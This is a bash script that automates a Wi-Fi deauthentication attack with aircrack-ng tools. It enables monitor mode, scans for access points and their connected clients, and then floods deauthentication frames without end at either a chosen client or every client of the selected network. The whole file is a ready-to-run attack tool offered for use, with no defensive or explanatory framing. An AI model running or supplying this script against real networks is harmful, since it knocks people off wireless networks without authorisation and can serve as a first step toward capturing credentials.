#!/bin/bash

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color



# CTRL+C handler
function ctrl_c() {
  echo -e "\n${RED}[!] Stopping attack...${NC}"
  kill $ATTACK_PID &>/dev/null
  echo -e "${YELLOW}[+] Disabling monitor mode...${NC}"
  airmon-ng stop wlan0mon > /dev/null
  echo -e "${YELLOW}[+] Restarting NetworkManager...${NC}"
  service NetworkManager start
  echo -e "${GREEN}[✓] Cleanup completed.${NC}"
  sleep 1
  clear
  echo -e "${BLUE}[+] Running methode.sh...${NC}"
  bash methode.sh
  exit
}
trap ctrl_c INT

# Check root
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[!] Please run as root.${NC}"
  exit 1
fi

# Check tools
for cmd in airmon-ng airodump-ng aireplay-ng xterm; do
  if ! command -v $cmd &> /dev/null; then
    echo -e "${RED}[!] Tool $cmd not found!${NC}"
    exit 1
  fi
done

echo -e "${YELLOW}[+] Killing interfering processes...${NC}"
airmon-ng check kill

echo -e "${YELLOW}[+] Enabling monitor mode on wlan0...${NC}"
airmon-ng start wlan0 > /dev/null

if ! ip link show wlan0mon &>/dev/null; then
  echo -e "${RED}[!] wlan0mon not found!${NC}"
  exit 1
fi

echo -e "${BLUE}[+] Scanning for networks... Press ENTER when ready.${NC}"
rm -f scan-01.csv
xterm -hold -e "airodump-ng wlan0mon --write scan --output-format csv" &
read -p $'\n[!] Press ENTER when ready to select target...' dummy
killall airodump-ng
sleep 2

IFS=$'\n'
networks=($(awk -F',' 'NR>1 && $1 ~ /([0-9A-Fa-f]{2}:){5}/ && NF > 14 {print $1","$4","$14}' scan-01.csv | sort | uniq))

if [ ${#networks[@]} -eq 0 ]; then
  echo -e "${RED}[!] No networks found.${NC}"
  exit 1
fi

echo -e "\n${GREEN}[+] Available Networks:${NC}"
for i in "${!networks[@]}"; do
  bssid=$(echo "${networks[$i]}" | cut -d',' -f1)
  ch=$(echo "${networks[$i]}" | cut -d',' -f2)
  essid=$(echo "${networks[$i]}" | cut -d',' -f3)
  printf "${YELLOW}[%s]${NC} ${BLUE}%s${NC} ${GREEN}[%s]${NC} (CH: ${RED}%s${NC})\n" "$i" "$essid" "$bssid" "$ch"
done

read -p $'\nEnter the network number to select: ' net_choice

if ! [[ "$net_choice" =~ ^[0-9]+$ ]] || [ "$net_choice" -ge "${#networks[@]}" ]; then
  echo -e "${RED}[!] Invalid choice${NC}"
  exit 1
fi

BSSID=$(echo "${networks[$net_choice]}" | cut -d',' -f1)
CHANNEL=$(echo "${networks[$net_choice]}" | cut -d',' -f2)

echo -e "${GREEN}[+] Selected Network:${NC} ${BLUE}$BSSID${NC} (Channel: ${RED}$CHANNEL${NC})"

echo -e "${YELLOW}[+] Setting channel...${NC}"
iwconfig wlan0mon channel $CHANNEL

echo -e "${BLUE}[+] Scanning for connected devices... Press ENTER when done.${NC}"
rm -f clients-01.csv
xterm -hold -e "airodump-ng --bssid $BSSID --channel $CHANNEL --write clients --output-format csv wlan0mon" &
read -p $'\n[!] Press ENTER when done scanning for clients...' dummy
killall airodump-ng
sleep 2

clients=($(awk -F',' '/Station MAC/ {f=1; next} f && NF>5 {gsub(/ /,"",$1); print $1}' clients-01.csv | sort | uniq))

if [ ${#clients[@]} -eq 0 ]; then
  echo -e "${RED}[!] No connected clients found.${NC}"
  exit 1
fi

echo -e "\n${GREEN}[+] Connected Devices:${NC}"
for i in "${!clients[@]}"; do
  printf "${YELLOW}[%s]${NC} %s\n" "$i" "${clients[$i]}"
done

echo -e "\n${BLUE}Select attack mode:${NC}"
echo -e "${YELLOW}[1]${NC} Deauth specific client"
echo -e "${YELLOW}[2]${NC} Deauth all clients"
read -p "Enter choice [1 or 2]: " mode

if [[ "$mode" == "1" ]]; then
  read -p "Enter the client number to target: " client_choice
  CLIENT="${clients[$client_choice]}"
  echo -e "${GREEN}[+] Starting Deauth attack on ${RED}$CLIENT${NC}..."
  aireplay-ng --deauth 0 -a $BSSID -c $CLIENT wlan0mon &
  ATTACK_PID=$!
elif [[ "$mode" == "2" ]]; then
  echo -e "${GREEN}[+] Starting Deauth attack on ${RED}ALL clients${NC}..."
  aireplay-ng --deauth 0 -a $BSSID wlan0mon &
  ATTACK_PID=$!
else
  echo -e "${RED}[!] Invalid choice${NC}"
  exit 1
fi

wait
